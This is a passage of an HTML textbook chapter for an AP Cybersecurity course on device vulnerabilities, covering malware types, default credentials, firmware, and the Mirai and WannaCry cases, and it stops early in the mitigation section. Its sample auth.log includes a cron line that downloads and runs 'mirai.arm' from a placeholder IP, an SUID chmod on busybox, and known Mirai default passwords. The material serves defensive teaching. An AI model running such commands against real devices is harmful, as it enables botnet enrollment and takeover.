@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>4.1 Device and Endpoint Vulnerabilities · Notes · Aayat-AP-Prep</title>
+<link rel="stylesheet" href="../../assets/notes/theme.css">
+<link rel="stylesheet" href="../../assets/vendor/prismjs-1.29.0/themes/prism-tomorrow.min.css">
+<script>MathJax = { tex: { inlineMath: [['$','$']], displayMath: [['$$','$$']] }, svg: { fontCache: 'global' } };</script>
+<script async src="../../assets/vendor/mathjax-3.2.2/es5/tex-svg.js"></script>
+<script src="../../assets/vendor/prismjs-1.29.0/prism.min.js"></script>
+<script src="../../assets/vendor/prismjs-1.29.0/components/prism-bash.min.js"></script>
+<script src="../../assets/vendor/jszip-3.10.1/jszip.min.js"></script>
+<script>window.EBOOK_META = { topicId: "4.1", topicTitle: "Device Vulnerabilities and Attacks", chapterLabel: "Topic 4.1" };</script>
+</head>
+<body>
+<nav class="top-nav">
+  <div class="actions">
+    <button class="print-action-btn" onclick="window.print()">Print Chapter</button>
+    <button class="epub-btn" onclick="exportChapterEPUB()">&#8681; EPUB</button>
+    <button class="epub-btn secondary" onclick="downloadOkularSidecar()">Okular Notes</button>
+  </div>
+</nav>
+
+<div class="reading-container">
+  <article class="textbook-chapter">
+    <h1 class="textbook-title">Topic 4.1</h1>
+    <h2 class="textbook-subtitle">Device Vulnerabilities and Attacks</h2>
+    <div class="outline-box">
+      <h4>Chapter Contents</h4>
+      <ul>
+        <li><a href="#sec-foundations">I. The Endpoint as the Attack Surface</a></li>
+        <li><a href="#sec-technical">II. Default Credentials, Firmware, and Unpatchable Devices</a></li>
+        <li><a href="#sec-case">III. Case Studies: Mirai and WannaCry</a></li>
+        <li><a href="#sec-protection">IV. Removing Defaults, Baselines, and Patch Management</a></li>
+        <li><a href="#sec-bibliography">V. References and Further Reading</a></li>
+      </ul>
+    </div>
+
+<div class="ap-alignment">
+  <h4>AP Cybersecurity Alignment</h4>
+  <p><strong>Unit 4: Securing Devices</strong> &middot; Topic 4.1, Device Vulnerabilities and Attacks</p>
+  <ul>
+    <li><span class="ap-code">4.1.A</span> <span class="ap-skill">Analyze Risk</span><br>Recognise the different classes of machine that count as computing devices, servers, workstations and laptops, mobile handsets, network appliances, and the embedded and industrial controllers that carry no screen and no keyboard, and account for the ways each class differs in what it can run, what it can be patched with, and how long its vendor will support it.</li>
+    <li><span class="ap-code">4.1.B</span> <span class="ap-skill">Analyze Risk</span><br>Work out, from what an incident actually did, which family of malicious software was involved: whether the code needed a host file and a human, whether it moved between machines unaided, whether it arrived wearing the costume of legitimate software, and whether its purpose was extortion, concealment, surveillance, or theft.</li>
+    <li><span class="ap-code">4.1.C</span> <span class="ap-skill">Analyze Risk</span><br>Trace the route from a weakness in a device, a factory password, a service nobody needed, an unpatched kernel, firmware whose vendor stopped shipping updates, to the concrete harm an adversary can produce with it: data lost, hardware damaged, operations halted, records destroyed.</li>
+    <li><span class="ap-code">4.1.D</span> <span class="ap-skill">Analyze Risk</span><br>Evaluate the weaknesses present on a given fleet of devices and record them in a form somebody else can act on, each finding scored for how likely it is to be exploited and how badly it would hurt, ranked against the others, and written down where the decision to fix or accept it can later be audited.</li>
+  </ul>
+  <p class="ap-source">Objective codes follow the <a href="https://apcentral.collegeboard.org/media/pdf/ap-cybersecurity-course-framework.pdf" target="_blank" rel="noopener">AP Cybersecurity Course Framework</a> (College Board, AP Career Kickstart). Objectives are paraphrased here, not quoted.</p>
+</div>
+
+    <div class="chapter-body">
+      <section class="textbook-section" id="sec-foundations">
+        <h3>I. The Endpoint as the Attack Surface</h3>
+
+<p>An <span class="annot">endpoint<span class="tip"><strong>Endpoint</strong>Any device that sits at the "end" of a network connection and is used directly by a person or a process, laptops, desktops, smartphones, servers, and IoT devices such as cameras or thermostats. Endpoints are the places where humans and software actually interact with data, which makes them the most frequently attacked layer of any network. <em>NIST SP 800-128 defines an endpoint as any device connecting to an enterprise network. Endpoint Detection and Response (EDR) tooling specifically targets this layer.</em></span></span> is the frontier of the enterprise attack surface, the place where the abstractions of network security (firewalls, segmentation, encrypted tunnels) terminate and a physical piece of hardware, running a real operating system with real software bugs, is exposed to a user or the open internet. While Unit 1 examined how attackers manipulate people, and later units examine network-layer defenses, this topic examines the device itself as the target: what makes an operating system, a piece of firmware, or an embedded controller inherently exploitable, and how adversaries convert a single compromised endpoint into a foothold for the rest of the network.</p>
+
+<p>The academic frame for this material is the concept of the <span class="annot">attack surface<span class="tip"><strong>Attack Surface</strong>The complete set of points where an unauthorized user could try to enter or extract data from a system, every open port, running service, installed application, user account, and physical interface. A bigger attack surface means more places for something to go wrong, the same way a house with ten unlocked windows is riskier than one with two. <em>Formalized by Manadhata &amp; Wing (2011), "An Attack Surface Metric," IEEE Transactions on Software Engineering. Reducing attack surface is a core tenet of NIST SP 800-53 control family CM (Configuration Management).</em></span></span>. Every running service, open network port, installed application, and default account on a device is a potential entry point. Endpoint security, as a discipline, is the practice of systematically minimizing that surface (hardening) while simultaneously assuming that some component of it will eventually be breached (defense in depth) and building detection capability around that assumption.</p>
+
+
+<h4>What Counts as a Device, and Why the Answer Matters</h4>
+
+<p>Before a fleet can be defended it has to be enumerated, and enumeration requires a taxonomy that predicts something. Sorting machines by form factor, desktop, laptop, tablet, phone, predicts almost nothing about their security posture. The properties that do predict it are three: how much general-purpose compute the device carries (and therefore whether a security agent can run on it at all), who controls its software supply (the owner, an employer, a carrier, or a manufacturer who has stopped answering the phone), and how long that supplier has committed to shipping fixes. Grouped by those properties, the fleet falls into five classes.</p>
+
+<ul>
+  <li><strong>Servers.</strong> Multi-user machines running shared services, physical or virtual, on-premises or in a cloud tenancy. Powerful, monitored, patched on a schedule, and disproportionately valuable, because a single host may hold the credentials, data, or authority of thousands of users. A domain controller is a server whose compromise is functionally the compromise of every workstation that trusts it.</li>
+  <li><strong>Workstations and laptops.</strong> Single-user general-purpose machines. They combine full compute (so they can run endpoint agents, disk encryption, and host firewalls) with the most exposed attack surface in the organisation, because a human sits in front of them opening mail and installing software. Portability adds a threat class the others lack: loss and theft, for which the control is full-disk encryption rather than anything network-shaped.</li>
+  <li><strong>Mobile devices.</strong> Phones and tablets running a hardened, sandboxed operating system with a vendor-curated application store. The sandbox makes classical malware harder and makes traditional endpoint agents largely impossible, a mobile security product cannot see other applications' memory, by design. Management moves to a different layer: mobile device management (MDM) profiles, application allowlists, and remote wipe. Software supply is controlled by the vendor and, on carrier-locked hardware, by an intermediary who may sit on updates for months.</li>
+  <li><strong>Network and infrastructure appliances.</strong> Routers, switches, firewalls, wireless access points, printers. They run real operating systems on constrained hardware, they are frequently omitted from asset inventories because nobody thinks of the printer as a computer, and they occupy positions of enormous leverage: an appliance that forwards traffic can also read, redirect, or fabricate it.</li>
+  <li><strong>Embedded, IoT, and operational-technology devices.</strong> Cameras, sensors, door controllers, medical infusion pumps, programmable logic controllers. Compute is measured in tens of megabytes; there is no place to install an agent; the update mechanism may require physical access, or may not exist; and the device may be expected to run for fifteen years in a plant nobody is willing to shut down. In operational technology the safety consequence is physical, which inverts the usual priority ordering: availability and integrity outrank confidentiality, and a security control that risks halting the process is often refused on those grounds.</li>
+</ul>
+
+<p>The classification earns its place because the mitigation catalogue differs by class, not by device. "Install endpoint detection and response" is available for the first two classes, marginal for the third, and unavailable for the fifth. When an agent cannot be installed, the defence has to be relocated to the network around the device, segmentation, egress filtering, passive traffic monitoring, which is why the same organisation can be simultaneously mature at laptop security and defenceless in its building-automation network.</p>
+
+<p>Malicious software, <span class="annot">malware<span class="tip"><strong>Malware</strong>Short for "malicious software", any program intentionally written to damage, disrupt, spy on, or gain unauthorized access to a computer system. Malware is a category, not a single technique; it includes viruses, worms, trojans, ransomware, rootkits, spyware, and more, each with a different method of infection and objective. <em>NIST SP 800-83 Rev. 1, "Guide to Malware Incident Prevention and Handling," is the canonical federal reference for malware taxonomy and response.</em></span></span>, is the primary payload category deployed once an endpoint vulnerability has been located. Understanding malware requires separating two independent questions that students frequently conflate: <strong>how does it get onto the device</strong> (the infection vector, phishing, drive-by download, USB, network exploit) and <strong>how does it propagate and persist once there</strong> (the behavioral classification below). A single sample of malware is often described using several of these classifications simultaneously, because they describe different dimensions of its behavior rather than mutually exclusive categories.</p>
+
+<ul>
+  <li><strong><span class="annot">Virus<span class="tip"><strong>Computer Virus</strong>A piece of malicious code that attaches itself to a legitimate host file or program and requires that host to execute in order to run and spread, like a biological virus, it cannot reproduce on its own; it needs a cell (a host program) to hijack. A virus typically requires some form of human action, such as opening an infected file, to trigger infection. <em>Cohen, F. (1987). "Computer Viruses: Theory and Experiments." Computers &amp; Security, 6(1), 22–35, the foundational academic paper defining computer viruses formally as self-replicating code.</em></span></span>:</strong> Requires a host file and human execution to activate and propagate; it inserts its code into legitimate executables or documents (macro viruses).</li>
+  <li><strong><span class="annot">Worm<span class="tip"><strong>Worm</strong>Self-replicating malware that spreads across a network completely on its own, without needing a host file or a human to click anything. A worm actively scans for other vulnerable machines and copies itself onto them automatically. This is the key distinction from a virus: worms are autonomous; viruses are parasitic. <em>The 1988 Morris Worm was the first internet worm and prompted the creation of the first CERT (Computer Emergency Response Team). Modern worms like WannaCry (2017) exploit unpatched network services (SMB/EternalBlue) to self-propagate.</em></span></span>:</strong> Self-propagating and network-aware; it does not need a host file or user interaction, scanning for and exploiting vulnerable services autonomously.</li>
+  <li><strong><span class="annot">Trojan (Trojan Horse)<span class="tip"><strong>Trojan Horse</strong>Malware disguised as, or bundled inside, a legitimate-looking piece of software. Named after the Greek myth: the malicious payload hides inside something the victim willingly installs. Unlike a virus or worm, a trojan does NOT self-replicate, it relies entirely on social engineering to convince the user to run it once. <em>Remote Access Trojans (RATs) like njRAT and DarkComet give attackers full interactive control of a compromised host. MITRE ATT&amp;CK classifies trojanized software as a common Initial Access (TA0001) and Execution (TA0002) vector.</em></span></span>:</strong> Disguised as legitimate software; relies entirely on deception rather than self-replication to achieve execution.</li>
+  <li><strong><span class="annot">Ransomware<span class="tip"><strong>Ransomware</strong>Malware that encrypts a victim's files (or locks their entire system) and demands payment, usually in cryptocurrency, in exchange for the decryption key. Modern ransomware groups also exfiltrate the data first and threaten to publish it even if the victim has backups, a tactic called "double extortion." <em>Ransomware-as-a-Service (RaaS) groups like LockBit and BlackCat/ALPHV lease their encryption toolkits to affiliates for a percentage of the ransom, industrializing the crime. FBI IC3 2023 report: ransomware losses exceeded $59.6 million in reported complaints alone.</em></span></span>:</strong> Encrypts victim data using strong symmetric+asymmetric cryptography and extorts payment for the decryption key; increasingly paired with data exfiltration for "double extortion."</li>
+  <li><strong><span class="annot">Rootkit<span class="tip"><strong>Rootkit</strong>A toolkit designed to gain and maintain privileged ("root" or "Administrator") access to a system while actively hiding its own presence, from the file system, from running-process lists, and even from the operating system kernel itself. The name comes from "root," the Unix superuser account. Rootkits are less about initial infection and more about long-term stealth and persistence. <em>Kernel-mode rootkits (ring 0) modify the OS kernel directly and are extremely difficult to detect from within the infected OS; firmware/bootkit rootkits (e.g., LoJax, 2018) persist below the OS entirely, surviving a full disk wipe.</em></span></span>:</strong> Grants and conceals privileged access, frequently by hooking OS kernel structures so that infected files, processes, and network connections are invisible to standard system tools.</li>
+</ul>
+
+<div class="prof-note">
+  <span class="prof-note-label">Two independent questions classify any sample</span>
+  A flat list of malware names is almost useless in front of a real incident, because the names answer two different questions and a list conflates them. Ask them separately. <em>How did the code arrive, and how does it move?</em>, a virus needs a host file and a person to open it; a worm crosses the network unaided; a trojan is carried in by a user who believed it was something else. <em>What is it for?</em>, ransomware extorts by encryption; a rootkit exists to remain unseen; spyware exfiltrates quietly; a bot rents the machine out. The two answers are orthogonal, and one file routinely earns several labels at once: a trojanised installer (arrival) that drops ransomware (purpose) and loads a kernel driver to hide itself (persistence). Analysts record all three, because each implies a different containment step.
+</div>
+
+<p>Beyond malware classification, endpoint compromise frequently hinges on <span class="annot">privilege escalation<span class="tip"><strong>Privilege Escalation</strong>The technique of exploiting a bug, misconfiguration, or design flaw to gain access rights higher than what was originally granted, turning a low-privileged foothold (e.g., a standard user account) into administrator or root-level control. Attackers almost never land with full access; they escalate step by step. <em>MITRE ATT&amp;CK Tactic TA0004. Split into "vertical" escalation (standard user → admin/root) and "horizontal" escalation (accessing another user's equally-privileged data). CWE-269, "Improper Privilege Management," catalogs common root causes.</em></span></span>, the deliberate exploitation of a flaw or misconfiguration to convert an initial low-privilege foothold into administrative control. Because most endpoint operating systems apply the principle of <span class="annot">least privilege<span class="tip"><strong>Principle of Least Privilege</strong>A security design rule stating that every user, program, and process should be granted only the minimum access rights necessary to perform its function, nothing more. A standard employee account should not be able to install kernel drivers; a web server process should not be able to read the entire filesystem. Reducing privilege reduces the blast radius of any single compromise. <em>Formalized by Saltzer &amp; Schroeder (1975), "The Protection of Information in Computer Systems," Proceedings of the IEEE, one of the foundational papers of computer security engineering. Codified as NIST SP 800-53 control AC-6.</em></span></span> to newly-created accounts by default, attackers who compromise a low-value account (e.g., via phishing) must still escalate before they can install persistent malware, disable security tooling, or move laterally to higher-value systems.</p>
+
+<p>Finally, an increasingly significant category of endpoint is the <span class="annot">Internet of Things (IoT)<span class="tip"><strong>Internet of Things (IoT)</strong>The broad category of everyday physical devices, cameras, thermostats, door locks, medical devices, industrial sensors, that are embedded with network connectivity, allowing them to send and receive data. IoT devices are frequently designed by manufacturers who prioritize cost and time-to-market over security engineering, resulting in weak default configurations that ship to millions of units simultaneously. <em>NISTIR 8228, "Considerations for Managing IoT Cybersecurity and Privacy Risks," identifies IoT devices as uniquely difficult to secure because they often cannot run traditional endpoint agents (antivirus/EDR) due to limited compute resources.</em></span></span> device: an embedded system, typically running a stripped-down Linux distribution, with limited compute resources, infrequent (or nonexistent) firmware update mechanisms, and, critically, factory-set default credentials that are rarely changed by end users or even documented for customers to change. These characteristics make IoT devices a uniquely attractive target for large-scale automated compromise.</p>
+
+      </section>
+
+      <section class="textbook-section" id="sec-technical">
+        <h3>II. Default Credentials, Firmware, and Unpatchable Devices</h3>
+
+<p>To understand why <span class="annot">default administrator passwords<span class="tip"><strong>Default Administrator Passwords</strong>The factory-preset username and password combination (e.g., admin/admin, root/12345) shipped on a device by the manufacturer, intended to be changed during initial setup. In practice, a large percentage of deployed devices, especially IoT hardware, are never reconfigured, leaving the default credentials permanently valid and, in many cases, publicly documented in the product manual or searchable online. <em>The Mirai botnet source code (leaked 2016) contains a hardcoded list of 61 common IoT default credential pairs that it brute-forces against any device it scans, this single list was sufficient to compromise hundreds of thousands of devices.</em></span></span> remain such an effective attack vector at internet scale, it is necessary to examine how automated scanning and credential-stuffing tools operate. Adversaries do not manually test devices one at a time; they run mass internet scanners (such as <span class="annot">Shodan<span class="tip"><strong>Shodan</strong>A search engine, but instead of indexing web pages like Google, Shodan continuously scans the entire internet and indexes metadata about every publicly reachable device: open ports, service banners, device models, and firmware versions. Security researchers and attackers alike use it to instantly find, for example, every unpatched IoT camera exposed to the internet in a given country. <em>Founded by John Matherly in 2009. Shodan queries can be filtered by port, product, geography, and CVE, making mass vulnerability discovery trivial without ever sending an exploit packet.</em></span></span> or custom masscan-based tooling) that fingerprint device banners on common ports, then feed matching hosts into automated credential-stuffing scripts.</p>
+
+<p>The following authentication log excerpt shows a successful compromise of an exposed device via default credentials, followed by an escalation attempt. This is representative of the syslog pattern security analysts are trained to recognize during triage.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header">
+    <span class="lang-badge">auth.log, Default Credential Compromise</span>
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  </div>
+<pre class="language-bash"><code>Jun 12 03:14:02 iot-cam-42 sshd[1188]: Failed password for admin from 198.51.100.12 port 51422 ssh2
+Jun 12 03:14:03 iot-cam-42 sshd[1188]: Failed password for admin from 198.51.100.12 port 51423 ssh2
+Jun 12 03:14:04 iot-cam-42 sshd[1188]: Failed password for root from 198.51.100.12 port 51424 ssh2
+Jun 12 03:14:05 iot-cam-42 sshd[1188]: Accepted password for admin from 198.51.100.12 port 51425 ssh2
+Jun 12 03:14:05 iot-cam-42 sshd[1188]: pam_unix(sshd:session): session opened for user admin
+Jun 12 03:14:06 iot-cam-42 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/chmod 4755 /bin/busybox
+Jun 12 03:14:07 iot-cam-42 kernel: audit: SUID bit set on /bin/busybox by uid=1000
+Jun 12 03:14:09 iot-cam-42 sshd[1201]: Accepted password for admin from 198.51.100.12 port 51430 ssh2
+Jun 12 03:14:10 iot-cam-42 cron[1204]: (admin) CMD (wget http://198.51.100.12/mirai.arm -O /tmp/.update; chmod +x /tmp/.update; /tmp/.update)</code></pre>
+</div>
+
+<p>Reading this log line by line: the source IP <code>198.51.100.12</code> attempts a small number of common username/password combinations (four failed logons in rapid succession, a signature of scripted brute forcing rather than a human typing), succeeds on the fifth attempt against the <code>admin</code> account, and immediately performs a <span class="annot">SUID bit<span class="tip"><strong>SUID Bit (Set User ID)</strong>A special Unix/Linux file permission flag that causes a program to run with the file owner's privileges rather than the privileges of the user who launched it. If a program owned by root has the SUID bit set, ANY user who executes it temporarily runs with root privileges for that execution. Attackers who gain limited access frequently set the SUID bit on a shell or utility binary as an easy way to regain root access later. <em>chmod 4755 sets the SUID bit (the leading "4") along with rwxr-xr-x permissions. CWE-272, "Least Privilege Violation," and MITRE ATT&amp;CK T1548.001 (Setuid and Setgid) formally document this technique.</em></span></span> escalation on <code>/bin/busybox</code>, a classic privilege-escalation persistence trick on embedded Linux devices, which grants root-equivalent execution to any subsequent invocation of that binary. Finally, a cron job downloads and executes a payload named <code>mirai.arm</code>, indicating enrollment into a Mirai-family IoT botnet.</p>
+
+<div class="prof-note critical">
+  <span class="prof-note-label">Inter-arrival time separates a script from a person</span>
+  What identifies the excerpt above as machine-driven is not the number of failures but the interval between them. A person who has forgotten a password produces failures separated by seconds or tens of seconds, the time it takes to retype, hesitate, and try a variant, and usually keeps the same username throughout. The log shows four failures inside three seconds, cycling the username between <code>admin</code> and <code>root</code>: that is a loop over a credential table, not a memory. Notice what the source-port column does as well. It increments by one on every attempt (51422, 51423, 51424, 51425), the signature of a client opening a fresh TCP connection per guess with no pause between them. Inter-arrival time and username churn are the two features a detection rule should key on; raw failure count alone will fire on every Monday morning after a long weekend.
+</div>
+
+<p>Insecure default configurations extend beyond credentials to unnecessary running services. <span class="annot">Telnet<span class="tip"><strong>Telnet</strong>A very old (1969) remote-login protocol that transmits all data, including the username and password used to log in, as unencrypted plaintext over the network. Anyone capturing network traffic between the client and the device (e.g., via a packet sniffer on the same network) can read the credentials directly. SSH (Secure Shell) was created specifically to replace Telnet by adding encryption. <em>RFC 854 defines Telnet (1983). Its continued presence on IoT devices is flagged by NIST SP 800-53 control CM-7 (Least Functionality) as an unnecessary and dangerous open service that should be disabled by default.</em></span></span> is frequently left enabled on IoT firmware by manufacturers for factory diagnostics and never disabled before shipping, exposing an unencrypted remote-administration channel on TCP port 23. Because Telnet transmits credentials as cleartext, any attacker positioned on the network path, or simply scanning for open port 23, can harvest valid logon credentials directly from the wire without needing to guess them at all.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header">
+    <span class="lang-badge">nmap, Firmware Service Fingerprinting</span>
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  </div>
+<pre class="language-bash"><code>$ nmap -sV -p 21,22,23,80,443,7547 10.0.0.42
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.3.4 (VULNERABLE: CVE-2011-2523 backdoor)
+22/tcp   closed ssh
+23/tcp   open  telnet  BusyBox telnetd (factory diagnostic shell)
+80/tcp   open  http    GoAhead-Webs (embedded HTTP admin panel)
+443/tcp  closed https
+7547/tcp open  cwmp    TR-069 CPE WAN Management Protocol
+
+Service Info: OS: Linux; Device: IP camera; CPE: cpe:/h:generic:ip_camera</code></pre>
+</div>
+
+<p>This scan illustrates a textbook insecure-default-configuration profile: SSH (the encrypted remote-management protocol) is disabled, while Telnet and an outdated FTP daemon with a known backdoor vulnerability remain open. Port 7547 running the <span class="annot">TR-069<span class="tip"><strong>TR-069 (CWMP)</strong>CPE WAN Management Protocol, a standard used by ISPs to remotely configure and manage customer routers and modems over the internet. Because it is designed to allow full remote reconfiguration for legitimate management, a vulnerability in its implementation gives an attacker the same sweeping remote-control capability. <em>TR-069 was the exploited protocol in the November 2016 Deutsche Telekom/Mirai router outage that knocked nearly a million routers offline.</em></span></span> management protocol is a common target for ISP-router-focused worm variants, since a flaw there grants remote configuration control equivalent to legitimate ISP administrative access.</p>
+
+
+<h4>Firmware, Support Lifetimes, and the Vulnerability That Cannot Be Patched</h4>
+
+<p><span class="annot">Firmware<span class="tip"><strong>Firmware</strong>The software stored in a device's non-volatile memory that runs before, and beneath, the operating system, the UEFI or BIOS on a PC, the bootloader and monolithic image on an embedded device, and the separate controllers inside disks, network cards, and management processors. Because firmware initialises the hardware and loads the OS, code running there sees and controls everything the OS does, while the OS has almost no ability to inspect it. <em>NIST SP 800-193, "Platform Firmware Resiliency Guidelines," specifies protection, detection, and recovery requirements for platform firmware; NIST SP 800-147 covers BIOS protection.</em></span></span> occupies a privileged position that makes it both a high-value target and an awkward one to defend. It executes before the operating system exists, so it establishes the environment the OS will trust rather than being constrained by it. Malicious code resident in firmware therefore survives the two remediations most organisations treat as final: reinstalling the operating system and replacing the disk. The 2018 <em>LoJax</em> campaign, documented by ESET, is the usual reference point, a UEFI rootkit that wrote itself into the SPI flash chip on the motherboard and reinstalled its payload on every boot, defeating disk wipes entirely.</p>
+
+<p>Three properties of firmware follow from where it sits, and each has a defensive consequence:</p>
+
+<ul>
+  <li><strong>It is invisible to the tools you have.</strong> Endpoint agents run as processes inside the operating system. Firmware runs beneath it and can lie to it. Detection has to come from a layer the firmware does not control, a hardware root of trust that measures the boot chain and reports the measurements to something off the host, which is the architecture that Secure Boot and measured boot with a TPM implement.</li>
+  <li><strong>It is updated rarely and badly.</strong> Firmware updates are risky (a failed flash can brick the device), often require a reboot or physical presence, and are frequently distributed outside the normal patch channel. Fleets accordingly run years behind on firmware while being current on operating-system patches, and the asset inventory usually cannot even report the firmware version.</li>
+  <li><strong>It has an expiry date set by someone else.</strong> When a manufacturer declares a product <strong>end-of-life</strong>, it stops issuing fixes. Vulnerabilities discovered after that date are permanent features of every deployed unit.</li>
+</ul>
+
+<p>That last point deserves to be stated plainly, because it is the one students most often mis-handle. A vulnerability in an end-of-life device is not a patching backlog item; there is no patch and there will not be one. The available responses are replacement, or compensating controls that make the vulnerability unreachable, putting the device on an isolated VLAN with no route to the internet, placing a filtering proxy in front of its management interface, restricting which hosts may address it at all. The distinction matters operationally: a patch closes a vulnerability, whereas a compensating control leaves it open and removes the adversary's access to it, which means the control has to be maintained forever and any change to the network can silently reinstate the exposure. WannaCry hit hospitals in 2017 largely because medical imaging equipment ran embedded Windows versions the device manufacturer had never certified a patch for, and the compensating segmentation those devices depended on turned out to be incomplete.</p>
+
+<div class="prof-note exam-focus">
+  <span class="prof-note-label">Vulnerability, threat, and exploit are three different objects</span>
+  The three words name three different objects, and risk work falls apart when they are used interchangeably. A <strong>vulnerability</strong> is a property of the system: Telnet is listening and the factory password still works. It exists whether or not anyone knows about it. A <strong>threat</strong> is an actor with the capability and the intent to act against that property, a botnet operator running an internet-wide scanner. It exists whether or not your system is vulnerable. An <strong>exploit</strong> is the specific instrument that joins the two: the credential-stuffing loop in Mirai's <code>scanner.c</code>. Risk is what emerges when all three coincide, which is why a vulnerability nobody can reach and a threat with nothing to attack both carry a risk near zero, and why removing any one of the three is a legitimate mitigation.
+</div>
+
+      </section>
+
+      <section class="textbook-section" id="sec-case">
+        <h3>III. Case Studies: Mirai and WannaCry</h3>
+
+<h4>Case Study 4.1.1: The Mirai Botnet (2016)</h4>
+<p>In September 2016, source code for the <span class="annot">Mirai<span class="tip"><strong>Mirai Botnet</strong>A piece of malware, first identified in 2016, that specifically targets IoT devices (routers, IP cameras, DVRs) by scanning the internet for open Telnet ports and attempting to log in using a hardcoded list of 61 factory default username/password pairs. Successfully compromised devices are conscripted into a botnet, a network of remotely controlled devices, and used to launch massive Distributed Denial of Service (DDoS) attacks. <em>Mirai means "future" in Japanese. Its source code was published on Hack Forums by its author "Anna-senpai" in September 2016, which paradoxically caused a proliferation of Mirai variants once the code became publicly available.</em></span></span> botnet malware was released, revealing a program purpose-built to compromise IoT devices, home routers, IP cameras, and digital video recorders, that had never had their factory-default Telnet credentials changed. Mirai's scanning engine continuously probed random IP ranges for open port 23, attempted its hardcoded credential list, the <code>scanner.c</code> table in the leaked source holds 62 entries, of which 61 are distinct pairs, including <code>admin/admin</code>, <code>root/12345</code>, and the vendor-specific <code>root/vizxv</code>, and upon success, downloaded and executed a small ARM/MIPS binary that enrolled the device into a command-and-control botnet.</p>
+<p>On October 21, 2016, an army of Mirai-infected devices launched a massive <span class="annot">Distributed Denial of Service (DDoS)<span class="tip"><strong>Distributed Denial of Service (DDoS)</strong>An attack that overwhelms a target server or service with a flood of traffic from many different sources simultaneously, making it unable to respond to legitimate requests, the "distributed" part means the flood comes from thousands of separate compromised devices at once, rather than a single machine, making the attack far larger and harder to block by simply banning one IP address. <em>MITRE ATT&amp;CK T1498. Dyn's own post-incident statement described attack traffic sourced from a botnet of up to 100,000 malicious endpoints, with peak traffic roughly fifty times normal volume; the widely repeated figure of 1.2 Tbps was a third-party estimate that Dyn explicitly declined to confirm. Cite it as an unverified estimate, not as a measurement.</em></span></span> attack against Dyn, a major DNS infrastructure provider. Because Dyn's DNS services resolved domain names for a large portion of the internet, the attack caused widespread outages for major platforms including Twitter, Netflix, Reddit, GitHub, and PayPal for several hours across the U.S. East Coast. The attack was ultimately traced to an estimated 100,000+ compromised IoT devices, none of which had been individually targeted, they were simply scanned, found vulnerable via default credentials, and conscripted en masse.</p>
+
+<div class="prof-note">
+  <span class="prof-note-label">One defect multiplied by a manufacturing run</span>
+  No individual camera owner was targeted. The attack worked because a manufacturing decision, one password baked into a firmware image and stamped onto every unit of a production run, is a single defect that ships pre-multiplied by the size of the run. The economics are what make it strategic. The attacker's marginal cost to compromise the ten-thousandth device is one more TCP connection; the owner's cost to fix it is ten thousand separate human decisions that will never all be made. That asymmetry is why the regulatory response in Section IV is aimed at the point of manufacture rather than the point of use, and why a fleet's risk is not the sum of its devices' individual risks. Homogeneity concentrates risk rather than averaging it.
+</div>
+
+<h4>Case Study 4.1.2: The WannaCry Ransomware Worm (2017)</h4>
+<p>In May 2017, the <span class="annot">WannaCry<span class="tip"><strong>WannaCry</strong>A ransomware worm that spread globally in May 2017 by exploiting a Windows Server Message Block (SMB) vulnerability, encrypting victims' files and demanding Bitcoin payment for decryption. Unlike typical ransomware that requires a user to open a malicious attachment, WannaCry self-propagated across networks automatically once it landed on one vulnerable machine, functioning simultaneously as ransomware AND a worm. <em>The exploit used, EternalBlue, was developed by the U.S. National Security Agency and leaked by the Shadow Brokers hacking group in April 2017, one month before the attack. Attributed by the U.S. and U.K. governments to the North Korean Lazarus Group.</em></span></span> ransomware worm infected an estimated 200,000+ computers across 150 countries within days, notably crippling parts of the United Kingdom's National Health Service (NHS), causing thousands of appointment and surgery cancellations. WannaCry combined two elements this chapter has classified separately: it was a <em>worm</em> in its propagation mechanism (using the <span class="annot">EternalBlue<span class="tip"><strong>EternalBlue</strong>The codename for an exploit targeting a critical remote code execution vulnerability (CVE-2017-0144) in Microsoft's SMBv1 (Server Message Block version 1) file-sharing protocol. It allowed an attacker to execute arbitrary code on a target machine with no authentication required, simply by sending a specially crafted network packet, making it ideal for wormable, fully automated propagation. <em>Microsoft had released a patch (MS17-010) a full month before the attack, meaning WannaCry primarily hit organizations with delayed patch management processes.</em></span></span> SMBv1 exploit to spread laterally across networks without any user interaction) and <em>ransomware</em> in its objective (encrypting files with a combination of AES and RSA and demanding roughly $300 in Bitcoin per infected machine).</p>
+<p>The rapid, global spread was made possible entirely by unpatched endpoints: Microsoft had shipped a patch closing the EternalBlue vulnerability a full month prior, but a large population of enterprise and government machines, many running unsupported Windows XP and Windows 7 installations, had not applied it. WannaCry was eventually slowed by a security researcher who discovered and registered an unregistered domain referenced in the malware's code, which acted as an unintentional "kill switch."</p>
+
+<div class="prof-note critical">
+  <span class="prof-note-label">Propagation and payload are separate axes</span>
+  WannaCry is the standard demonstration that the categories in Section I are axes, not bins. Its propagation was wormlike: EternalBlue against SMBv1, with no user action anywhere in the chain. Its payload was ransomware: hybrid symmetric/asymmetric encryption of user files and a Bitcoin demand. Collapsing it to one word discards information that changes the response. Recorded as ransomware alone, the incident is closed by restoring from backup, and the worm reinfects the restored host within minutes, because the SMB service is still listening and still unpatched. Recorded as a worm alone, the port is closed and nobody looks for the encrypted files. Propagation determines containment; payload determines recovery. Both have to be named.
+</div>
+
+      </section>
+
+      <section class="textbook-section" id="sec-protection">
+        <h3>IV. Removing Defaults, Baselines, and Patch Management</h3>
+
+<p>Mitigating device endpoint vulnerabilities requires a layered set of administrative, technical, and procedural controls aligned to recognized frameworks:</p>
+
+<h4>1. Eliminating Default Configurations</h4>
+<p>Organizations should enforce mandatory credential rotation and <span class="annot">Telnet service disablement<span class="tip"><strong>Telnet Service Disablement</strong>The hardening action of turning off the Telnet daemon on a device entirely (rather than merely changing its password), removing the unencrypted remote-administration attack surface altogether and forcing all remote management through an encrypted alternative such as SSH. <em>NIST SP 800-53 control CM-7, "Least Functionality," directs organizations to disable all services not explicitly required for business operations, Telnet almost never meets this bar on a modern network.</em></span></span> as a standard build requirement before any device is provisioned onto a production network, verified through automated configuration compliance scanning (e.g., CIS-CAT, OpenSCAP) rather than manual spot checks.</p>
+
